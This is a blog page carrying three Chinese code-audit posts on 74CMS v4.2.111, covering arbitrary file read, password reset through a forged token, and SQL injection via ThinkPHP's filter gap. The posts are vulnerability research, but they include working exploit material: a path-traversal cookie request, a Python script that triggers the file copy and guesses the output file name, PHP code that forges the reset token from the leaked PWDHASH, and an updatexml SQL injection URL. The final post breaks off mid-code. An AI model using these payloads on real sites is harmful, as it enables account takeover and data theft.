<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/uploads/xzpq.jpg?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="找回当年那个被寄予厚望的自己">
<meta property="og:type" content="website">
<meta property="og:title" content="P0rZ9&#39;s blog">
<meta property="og:url" content="http://yoursite.com/page/2/index.html">
<meta property="og:site_name" content="P0rZ9&#39;s blog">
<meta property="og:description" content="找回当年那个被寄予厚望的自己">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="P0rZ9&#39;s blog">
<meta name="twitter:description" content="找回当年那个被寄予厚望的自己">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/2/"/>





  <title>P0rZ9's blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">P0rZ9's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/10/74CMS_V4.2.111任意文件读取到任意密码重置/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/10/74CMS_V4.2.111任意文件读取到任意密码重置/" itemprop="url">代码审计 | 74CMS_V4.2.111任意文件读取到任意密码重置</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-10T09:15:41+08:00">
                2018-10-10
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<p>审计cms：<a href="http://static.zybuluo.com/chhyx/jnsrp4ki483xp9oi2ryenh2z/image_1cpe26mdq14po5331v8a1gik1132d.png" target="_blank" rel="noopener">74cms_v4.2.111</a><br>漏洞原理:任意文件读取得到关键Token来修改用户密码。<br>任意文件读取漏洞可参考笔者之前的文章:<a href="https://p0rz9.github.io/2018/10/09/74CMS_V4.2.111%E4%B8%80%E5%A4%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E9%99%84py%E8%84%9A%E6%9C%AC/" target="_blank" rel="noopener">74CMS_V4.2.111一处任意文件读取附py脚本</a></p>
<p><strong>代码分析</strong><br>1.在查看<code>Home\Controller\ApiController.class.php</code>代码时:<br>发现编辑会员资料时可用<code>uid</code>修改密码<br><img src="http://static.zybuluo.com/chhyx/jnsrp4ki483xp9oi2ryenh2z/image_1cpe26mdq14po5331v8a1gik1132d.png" alt="image_1cpe26mdq14po5331v8a1gik1132d.png-60.4kB"></p>
<p>遂拿起Burp测试一波:<br><img src="http://static.zybuluo.com/chhyx/gdusp76823b283ot2p7my7ou/image_1cpdu0m528571igq1v16eirejpp.png" alt="image_1cpdu0m528571igq1v16eirejpp.png-84.1kB"></p>
<p>发现显示Token验证失败 我们跟进验证token的函数<code>check_token()</code>:<br><img src="http://static.zybuluo.com/chhyx/e0p6ctn3i3xh1smil7qikr9d/image_1cpduafgk1ps31irv1c5h12g9f7716.png" alt="image_1cpduafgk1ps31irv1c5h12g9f7716.png-57.2kB"></p>
<p>我们要想通过<code>token</code>验证 需要满足这个条件:</p>
<pre><code>(decrypt($token,C(&apos;PWDHASH&apos;))==C(&apos;PWDHASH&apos;))
</code></pre><p>2.跟进<code>decrypt()</code>,发现这是一个解密函数,参数为源字符串与密钥:</p>
<pre><code>function decrypt($txt, $key = &apos;_qscms&apos;) {//token  C
// $txt 的结果为加密后的字串经过 base64 解码，然后与私有密匙一起，
// 经过 passport_key() 函数处理后的返回值
$txt = passport_key(base64_decode($txt), $key);
// 变量初始化
$tmp = &apos;&apos;;
// for 循环，$i 为从 0 开始，到小于 $txt 字串长度的整数
for ($i = 0; $i &lt; strlen($txt); $i++) {
    // $tmp 字串在末尾增加一位，其内容为 $txt 的第 $i 位，
    // 与 $txt 的第 $i + 1 位取异或。然后 $i = $i + 1
    $tmp .= $txt[$i] ^ $txt[++$i];
}
// 返回 $tmp 的值作为结果
return $tmp;
</code></pre><p>}</p>
<p>分析代码可得到正确的token值为<code>C(&#39;PWDHASH&#39;)</code>与密钥<code>C(&#39;PWDHASH&#39;)</code>经过<code>encrypt()</code>加密得到的字符串。</p>
<p>我们先测试下如果拿到正确Token可不可以成功修改密码:<br><img src="http://static.zybuluo.com/chhyx/s0rm02likekl3984br8648j0/image_1cpe4ogft18r2iof1jeidqf1n7v2m.png" alt="image_1cpe4ogft18r2iof1jeidqf1n7v2m.png-89.3kB"></p>
<p>去Burp测试:<br><img src="http://static.zybuluo.com/chhyx/a2od1lkyzvmohwm4qgqttoi3/image_1cpe4t1s01ce91irna0brlj1l2r33.png" alt="image_1cpe4t1s01ce91irna0brlj1l2r33.png-97.4kB"></p>
<p>可看到修改成功。</p>
<p>3.那现在的问题转化为如何去获取密钥<code>C(&#39;PWDHASH&#39;)</code><br>因为这个值是系统定义好的,那我们就可以利用昨天审出的文件读取来得到密钥,我们搜索下定义密钥的文件,得到<code>pwdhash.php</code>。</p>
<p>4.现在利用漏洞就很简单了</p>
<pre><code>python脚本获取含有密钥的jpg文件--&gt;PHP利用密钥进行加密,得到token--&gt;用得到的token修改用户密码
</code></pre><p><strong>漏洞利用</strong><br>1.通过任意文件读取<br><code>upload\Application\Common\Conf\pwdhash.php</code>文件,得到一个包含pwdhash值的jpg文件</p>
<p><img src="http://static.zybuluo.com/chhyx/e1c4hizaw7ro9iph3nht1cof/image_1cpe3saa8fdl6tkc2idmr10b529.png" alt="image_1cpe3saa8fdl6tkc2idmr10b529.png-76.1kB"></p>
<p>2.我们本地加密得到<code>token</code>:</p>
<pre><code>#demo.php
&lt;?php

function get_token($pwdhash){
    $token = encrypt($pwdhash,$pwdhash);
    var_dump($token);

}
function encrypt($txt, $key = &apos;_qscms&apos;) {
    ...
}
function passport_key($txt, $encrypt_key) {
   ...
}

$file_name = &apos;http://127.0.0.1:84/data/upload/avatar/1810/10/76162f0285d10193b1d79ceff9653d1c.jpg&apos;;
$data = eval(str_replace(&apos;&lt;?php&apos;, &apos;&apos;, file_get_contents($file_name)));
get_token($data[&apos;PWDHASH&apos;]);
?&gt;
</code></pre><p>得到Token<br><img src="http://static.zybuluo.com/chhyx/zko0432p3ubba1cbxq8e3l9z/image_1cpe1iard1uic199ju9kueb1u4h1j.png" alt="image_1cpe1iard1uic199ju9kueb1u4h1j.png-111.9kB"></p>
<p>3.用得到的token修改密码:<br><img src="http://static.zybuluo.com/chhyx/quwblkxx885w7i2eylbn5g12/image_1cpe1lksk20k5mfq9b1u5vvre20.png" alt="image_1cpe1lksk20k5mfq9b1u5vvre20.png-103.6kB"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/09/74CMS_V4.2.111一处任意文件读取附py脚本/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/09/74CMS_V4.2.111一处任意文件读取附py脚本/" itemprop="url">代码审计 | 74CMS_V4.2.111一处任意文件读取附py脚本</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-09T09:15:41+08:00">
                2018-10-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<p>审计cms：<a href="https://p0rz9.github.io/2018/10/08/74CMS_V4.2.111%E5%A4%9A%E5%A4%84sql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">74cms_v4.2.111</a><br>漏洞原理:<code>copy()</code>操作的两个参数可控,导致可将目标文件内容复制到图片,然后下载图片进行读取源码</p>
<p>##<strong>1.基础知识:</strong><br>74cms是基于ThinkPHP3.2.3而建<br><code>Thinkphp</code>的一些基本操作可参考笔者以前的文章:<br><a href="http://static.zybuluo.com/chhyx/x7syyvsfcuec6nhlrsdkatbx/image_1cpc6ufrd7gugtklt11fud1lku9.png" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/28/TP框架数据操作/</a></p>
<p>##<strong>2.环境搭建:</strong><br><a href="http://www.74cms.com/download/index.html" target="_blank" rel="noopener">骑士官网</a>下载最新版本<code>74cms_v4.2.111</code>安装到本地即可。</p>
<p>##<strong>3.漏洞利用:</strong><br>因为笔者是本地测试的,并没有开启短信服务,所以在这里先注释掉对验证码的判断来完成漏洞利用<br><img src="http://static.zybuluo.com/chhyx/tty53uwi3zfjnmism4ic3jcm/image_1cpcbkt29r67qm81tiassp2ve25.png" alt="image_1cpcbkt29r67qm81tiassp2ve25.png-75.4kB"></p>
<p>这里我们以读取入口文件为例<br><strong>paylaod</strong>:</p>
<pre><code>url: http://127.0.0.1:84/index.php?m=Home&amp;c=Members&amp;a=register
headers: Content-Type: application/x-www-form-urlencoded
        X-Requested-With: XMLHttpRequest
Cookie: members_bind_info[temp_avatar]=../../../../index.php;members_uc_info[uid]=1
POST: ucenter=bind&amp;utype=2&amp;reg_type=1&amp;org=bind
</code></pre><p>访问生成的特定<code>jpg</code>文件,下载到本地用编辑器打开即可看到<code>index.php</code>的内容<br><img src="http://static.zybuluo.com/chhyx/x7syyvsfcuec6nhlrsdkatbx/image_1cpc6ufrd7gugtklt11fud1lku9.png" alt="image_1cpc6ufrd7gugtklt11fud1lku9.png-72.6kB"></p>
<p>##<strong>4.代码分析:</strong><br>这里只贴出相关代码。<br>1.根据<code>payload</code>定位到漏洞文件：</p>
<pre><code>#upload\Application\Home\Controller\MembersController.class.php

public function register(){
    ...
    if(IS_POST &amp;&amp; IS_AJAX){
        $data[&apos;reg_type&apos;] =     
        I(&apos;post.reg_type&apos;,0,&apos;intval&apos;);//注册方式(1:手机，2:邮箱，3:微信)
        $data[&apos;utype&apos;] = I(&apos;post.utype&apos;,0,&apos;intval&apos;);
        if($data[&apos;reg_type&apos;] == 1){//进入
             //判断验证码
        ...

        if(&apos;bind&apos; == $ucenter = I(&apos;post.ucenter&apos;,&apos;&apos;,&apos;trim&apos;)){
            $uc_user = cookie(&apos;members_uc_info&apos;);
            $data = array_merge($data,$uc_user);//合并数组

            $passwordVerify = $data[&apos;password&apos;];
        }
        ...
        if($data[&apos;reg_type&apos;] == 1 &amp;&amp; $data[&apos;utype&apos;] ==2){
            ...
        if(&apos;bind&apos; == I(&apos;post.org&apos;,&apos;&apos;,&apos;trim&apos;) &amp;&amp; cookie(&apos;members_bind_info&apos;)){
            $user_bind_info = object_to_array(cookie(&apos;members_bind_info&apos;));
            $user_bind_info[&apos;uid&apos;] = $data[&apos;uid&apos;];
            ...
            $this-&gt;_save_avatar($user_bind_info[&apos;temp_avatar&apos;],$data[&apos;uid&apos;]);//临时头像转换
            //跟进_save_avatar()函数
</code></pre><p>跟进_save_avatar()函数:</p>
<pre><code>#upload\Application\Home\Controller\MembersController.class.php
protected function _save_avatar($avatar,$uid){
    if(!$avatar) return false;
$path = C(&apos;qscms_attach_path&apos;).&apos;avatar/temp/&apos;.$avatar;

    $image = new \Common\ORG\ThinkImage();
$date = date(&apos;ym/d/&apos;);

    $save_avatar=C(&apos;qscms_attach_path&apos;).&apos;avatar/&apos;.$date;//图片存储路径
    //data/upload/avatar/1810/09/
    if(!is_dir($save_avatar)) mkdir($save_avatar,0777,true);
    $savePicName = md5($uid.time()).&quot;.jpg&quot;;
    $filename = $save_avatar.$savePicName;
$size = explode(&apos;,&apos;,C(&apos;qscms_avatar_size&apos;));

    copy($path, $filename);//漏洞触发点
</code></pre><p>这里简单分析下代码:</p>
<p><img src="http://static.zybuluo.com/chhyx/ggsy0ntyi0jzti5qrzxhdabl/image_1cpcb92na1lk3qso1ik1jdh41p1o.png" alt="image_1cpcb92na1lk3qso1ik1jdh41p1o.png-121.9kB"></p>
<p>大家能看到最后一行有<code>unlink</code>操作,但是这里并不会造成任意文件删除 因为<code>$path</code>不是图片 <code>$image-&gt;open()</code>会报错,不过是存在任意图片删除的。</p>
<p>2.这里漏洞的关键是在于<code>copy</code>操作的两个参数我们都可控,且没过滤../等敏感字符导致任意文件读取。</p>
<p>3.我们理一下漏洞利用条件:</p>
<pre><code>a.IS_POST &amp;&amp; IS_AJAX
b.$data[&apos;reg_type&apos;] == 1 &amp;&amp; $data[&apos;utype&apos;] ==2  //注册必要
c.$ucenter == &apos;bind&apos;
d.$org == &apos;bind&apos;
e.cookie中含有members_bind_info字段且不为空
</code></pre><p>4.解释下所用paylaod:</p>
<pre><code>url: http://127.0.0.1:84/index.php?m=Home&amp;c=Members&amp;a=register
headers: Content-Type: application/x-www-form-urlencoded
        X-Requested-With: XMLHttpRequest //满足AJAX操作
Cookie: members_bind_info[temp_avatar]=../../../../index.php;members_uc_info[uid]=1                        //读取的文件及上文e条件
POST: ucenter=bind&amp;utype=2&amp;reg_type=1&amp;org=bind //满足上文bcd条件
</code></pre><p>5.py脚本:</p>
<pre><code># -*- coding: utf-8 -*-
#author: P0rZ9
#env: python2

import requests
import hashlib
import time

url = &apos;http://127.0.0.1:84/index.php?m=Home&amp;c=Members&amp;a=register&apos;
headers = {
    &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0&apos;,
    &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;,
    &apos;X-Requested-With&apos;: &apos;XMLHttpRequest&apos;
}
data = &apos;ucenter=bind&amp;utype=2&amp;reg_type=1&amp;org=bind&apos;
cookies = {&apos;members_bind_info[temp_avatar]&apos;: &apos;../../../../index.php&apos;, &apos;members_uc_info[uid]&apos;: &apos;1&apos;}

def copy_file():
    re = requests.post(url,data=data,headers=headers,cookies=cookies)
    print &apos;[-]file_copy_success&apos;

def get_file_name():
    state_time = &apos;%.0f&apos;%(time.time()-20)
    for i in range(20):
        pay_time = int(state_time) + i
        img_url = &apos;http://127.0.0.1:84/data/upload/avatar/1810/09/%s&apos;%(md5_str(&apos;1&apos;+str(pay_time))+&apos;.jpg&apos;)
        r = requests.get(img_url)
        if &apos;No input file specified.&apos; not in r.text:
            print &apos;[-]result_file:%s&apos;%img_url

def md5_str(str):
    h1 = hashlib.md5()
    h1.update(str.encode(encoding=&apos;utf-8&apos;))  # 传入需要加密的字符串进行MD5加密
    return h1.hexdigest() 

def main():
    copy_file()
    get_file_name()

main()
</code></pre><p>成功截图:<br><img src="http://static.zybuluo.com/chhyx/1vh2q0dq88fr57e1di1dhl9m/image_1cpcf5kaeh1h1lora691vfp12542i.png" alt="image_1cpcf5kaeh1h1lora691vfp12542i.png-207.8kB"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/08/74CMS_V4.2.111多处sql注入/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/08/74CMS_V4.2.111多处sql注入/" itemprop="url">代码审计 | 74CMS_V4.2.111多处SQL注入</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-08T12:15:41+08:00">
                2018-10-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<p>漏洞的大致思路:</p>
<pre><code>1.找到think_filter()漏掉的表达式match
2.搜索用到where的参数可控的函数
 a.get post cookie header等接收的参数
 b.函数直接接收的参数 如  public function($id)
3.用表达式构造sql语句
</code></pre><hr>
<p>##<strong>基础知识:</strong><br>总结一下在拿到一个基于TP框架开发的cms 审计流程是怎样的<br>这里以74cm最新版本<a href="http://www.74cms.com/download/load/id/534.html" target="_blank" rel="noopener">74cms_Home_Setup_v4.2.111</a>为例:<br>1.查看TP版本:</p>
<pre><code>#upload\ThinkPHP\ThinkPHP.php
</code></pre><p><img src="http://static.zybuluo.com/chhyx/801cmnatics78bjp256lnu06/image_1cp969qp91hik13s31ua71t3a134e9.png" alt="image_1cp969qp91hik13s31ua71t3a134e9.png-23.6kB"><br>2.查看系统参数过滤情况:</p>
<pre><code>#upload\applicaton\common\conf\config.php
</code></pre><p><img src="http://static.zybuluo.com/chhyx/mpakzoyvfnp4eecpbsgem1hg/image_1cp96cpbe1fnq12uf1obr1sdt4dc1m.png" alt="image_1cp96cpbe1fnq12uf1obr1sdt4dc1m.png-54.6kB"></p>
<p><img src="http://static.zybuluo.com/chhyx/a036krjqziyp0q6fh9oikno5/image_1cp96prer19gn1n601jkuvocnje33.png" alt="image_1cp96prer19gn1n601jkuvocnje33.png-80.3kB"></p>
<p>结果:使用I函数过滤的都会使用这三个函数进行过滤：</p>
<pre><code>htmlspecialchars,stripslashes,strip_tags
</code></pre><p>我们测试下基本的过滤规则:<br>在<code>upload\application</code>目录下新建<code>TestController.class.php</code>:</p>
<pre><code>&lt;?php
namespace Home\Controller;
class TestController{

function tt()
{    
    var_dump($_GET[&apos;id&apos;]);
    var_dump(I(&apos;get.num&apos;,&apos;&apos;));
}
}
</code></pre><p>访问:<code>http://127.0.0.1:84/index.php?m=Home&amp;c=Test&amp;a=tt&amp;id=2&#39;&quot;&lt;&gt;&amp;num=1&#39;&quot;&lt;&gt;</code><br>查看过滤信息 并未对单引号进行过滤<br><img src="http://static.zybuluo.com/chhyx/thfdp8xy6s1p42kn97offf37/image_1cp770ot51evk1n6h10fh1u2daa29.png" alt="image_1cp770ot51evk1n6h10fh1u2daa29.png-67.5kB"></p>
<p>所有经过过滤的参数对value肯定是有过滤,但对key未进行过滤：<br><img src="http://static.zybuluo.com/chhyx/0lakimfywrv6vibn4y7xy9wv/image_1cp773ng54rvi421e9og3g10okm.png" alt="image_1cp773ng54rvi421e9og3g10okm.png-24.1kB"></p>
<p>这里大概整理一下:<br>a.<code>_GET _POST _REQUEST _SERVER _FILES</code>系统无过滤<br>b.系统大部分使用的是<code>I</code>函数进行数据操作与过滤<br>c.调用<code>I</code>函数默认使用以下过滤规则:</p>
<pre><code>a.将预定义字符`&amp; &quot; &apos; &lt; &gt;`转化为html实体 （单引号只有在设置ENT_QUOTES 才会转为实体）
b.stripslashes() 函数删除由 addslashes() 函数添加的反斜杠
c.strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签
</code></pre><p>d.所有经过过滤的参数对value有过滤,但对key未进行过滤</p>
<p>我们重点关注sql注入,可以知道并未对单引号进行过滤,所以我们可以</p>
<pre><code>a.查找系统中拥有字符串拼接的地方
b.查看是否有不使用I函数而带入数据库的 可进行框架注入
</code></pre><p>3.如果有自带的get post cookie方法 查看其过滤规则</p>
<p>更多基础知识请移步:<br><a href="http://static.zybuluo.com/chhyx/0lakimfywrv6vibn4y7xy9wv/image_1cp773ng54rvi421e9og3g10okm.png" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/28/TP框架数据操作</a></p>
<p>##<strong>本地测试:</strong><br>1.开启debug+trace模式:<br>a.<code>upload\Application\Common\Conf\config.php</code>添加内容:</p>
<pre><code>&apos;SHOW_PAGE_TRACE&apos;        =&gt;  true,
</code></pre><p>b.在<code>upload\index.php</code>将<code>APP_DEBUG</code>设置为<code>true</code></p>
<p>2.查看<code>I</code>函数的过滤情况:<br>这里的漏洞情况与笔者前几天分析的<a href="https://p0rz9.github.io/2018/09/25/thinkphp5.0.10%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4%E4%B8%8D%E5%85%A8%E5%AF%BC%E8%87%B4%E4%B8%80%E5%A4%84%E7%9B%B2%E6%B3%A8/" target="_blank" rel="noopener">thinkphp5.0.10函数过滤不全导致一处盲注</a>思路类似,都是<code>I</code>函数用的过滤函数<code>think_filter()</code>过滤不全导致注入。</p>
<p>think_filter():<br><img src="http://static.zybuluo.com/chhyx/kenyd6ju23x35t1zpnnkcver/image_1cp99h5raa7dr6hebthgk19388i.png" alt="image_1cp99h5raa7dr6hebthgk19388i.png-21.4kB"></p>
<p>系统自带的表达式:<br><img src="http://static.zybuluo.com/chhyx/2rm44f6cgdjpupj9xft5k245/image_1cp99k0aj19jngo1vtt1sc51cffa2.png" alt="image_1cp99k0aj19jngo1vtt1sc51cffa2.png-17.6kB"></p>
<p>这里漏掉了多个表达式<br>eq,is,is not,match,match_mode,match_with</p>
<p>这里我们选取match进行利用,我们查看match相关的操作代码:</p>
<p><img src="http://static.zybuluo.com/chhyx/sphmu2yx9iwyhfergt9m7q2d/48b21d73-b2d1-4b7c-aa68-d5042a5315e0.png" alt="48b21d73-b2d1-4b7c-aa68-d5042a5315e0.png-16.8kB"></p>
<p>要想构造sql注入,需要闭合前面的双引号,但是文章开头我们说了I函数的过滤规则是过滤双引号的,这时候我们就需要寻找一处不经过I函数的或不过滤双引号的地方来构造漏洞。</p>
<p>测试代码:</p>
<pre><code>#Application\Home\Controller\IndexController.class.php
public function index($id){//直接接收的参数$id不经过I函数过滤
M(&apos;test_user&apos;)-&gt;field(&apos;id,name&apos;)-&gt;where(array(&apos;id&apos; =&gt; $id))-&gt;find();
        echo M(&apos;test_user&apos;)-&gt;getLastSql();
</code></pre><p>payload:</p>
<pre><code>http://127.0.0.1:84/index.php?m=home&amp;c=index&amp;a=index&amp;id[0]=match&amp;id[1][0]=aa&quot;) and updatexml(1,concat(0x7e,(select user())),0)-- a
</code></pre><p>利用:<br><img src="http://static.zybuluo.com/chhyx/4wga2ajqcvsn9itkplwlmcfn/image_1cp97gkt7g831hsb60ahpiigo3g.png" alt="image_1cp97gkt7g831hsb60ahpiigo3g.png-90.9kB"></p>
<p>##<strong>漏洞利用:</strong><br>在74cms中寻找形如寻找形如<code>M()-&gt;where($id)--&gt;xx</code>,只要where中参数可控且不会过滤双引号即可。<br>我们在编辑器内搜索相关代码调试,得到4处可利用的点。</p>
<p>1.<code>upload\Application\Home\Controller\AjaxPersonalController.class.php</code><br><code>$company_id</code> 函数直接接收的参数,不受过滤规则的约束,可控且无过滤</p>
<pre><code>#AjaxPersonalController.class.php 137行
public function company_focus($company_id){
    if(!$company_id){
        $this-&gt;ajaxReturn(0,&apos;请选择企业！&apos;);
    }
    $r = D(&apos;PersonalFocusCompany&apos;)-&gt;add_focus($company_id,C(&apos;visitor.uid&apos;));
    $this-&gt;ajaxReturn($r[&apos;state&apos;],$r[&apos;msg&apos;],$r[&apos;data&apos;]);
}
</code></pre><p>跟进<code>add_focus()</code>函数:<br><img src="http://static.zybuluo.com/chhyx/9hfa3dlxobcwng3xz5r7kkn0/image_1cp8q661n1lqaeh516sebh1bqp2p.png" alt="image_1cp8q661n1lqaeh516sebh1bqp2p.png-68.2kB"></p>
<p><img src="http://static.zybuluo.com/chhyx/605l40sydht50z29duok12zn/image_1cp8qpd2bf871bsa10431083p54d3.png" alt="image_1cp8qpd2bf871bsa10431083p54d3.png-310.8kB"></p>
<p>2.<code>upload\Application\Home\Controller\CompanyServiceController.class.php</code></p>
<pre><code>$order = D(&apos;Order&apos;)-&gt;where(array(&apos;id&apos;=&gt;$order_id))-&gt;find();
</code></pre><p><code>$order_id</code>函数直接接收的参数 不受过滤规则的约束<br>可控且无过滤</p>
<pre><code>public function order_pay_finish($order_id){
$order = D(&apos;Order&apos;)-&gt;where(array(&apos;id&apos;=&gt;$order_id))-&gt;find();
    ...
}
</code></pre><p><img src="http://static.zybuluo.com/chhyx/vogy2h9r4ttmtfm44urvgnfy/image_1cp8qjt291cs21urq1ohr1onmjivat.png" alt="image_1cp8qjt291cs21urq1ohr1onmjivat.png-91.4kB"></p>
<p>3.<code>upload\Application\Home\Controller\MembersController.class.php</code></p>
<pre><code>#MembersController.class.php 220行
public function register(){
        ...
        if(IS_POST &amp;&amp; IS_AJAX){
            $data[&apos;reg_type&apos;] = I(&apos;post.reg_type&apos;,0,&apos;intval&apos;);//注册方式(1:手机，2:邮箱，3:微信)
            $array = array(1 =&gt; &apos;mobile&apos;,2 =&gt; &apos;email&apos;);
            $data[&apos;utype&apos;] = I(&apos;post.utype&apos;,0,&apos;intval&apos;);

            if($data[&apos;reg_type&apos;] == 1){//进入
                $data[&apos;mobile&apos;] = I(&apos;post.mobile&apos;,0,&apos;trim&apos;);//注意
                 //判断验证码
            ...

            if(&apos;bind&apos; == $ucenter = I(&apos;post.ucenter&apos;,&apos;&apos;,&apos;trim&apos;)){
                $uc_user = cookie(&apos;members_uc_info&apos;);
                $data = array_merge($data,$uc_user);//合并数组

                $passwordVerify = $data[&apos;password&apos;];
            }
            ...
            // 若手机号重复且勾选了解绑原帐号
            if($data[&apos;reg_type&apos;] == 1 &amp;&amp; $data[&apos;utype&apos;] ==2){
                $data[&apos;unbind_mobile&apos;] = I(&apos;post.unbind_mobile&apos;,0,&apos;intval&apos;);
                if($data[&apos;unbind_mobile&apos;]){
                    $repeat = M(&apos;Members&apos;)-&gt;where(array(&apos;mobile&apos;=&gt;$data[&apos;mobile&apos;]))-&gt;select();//漏洞触发点
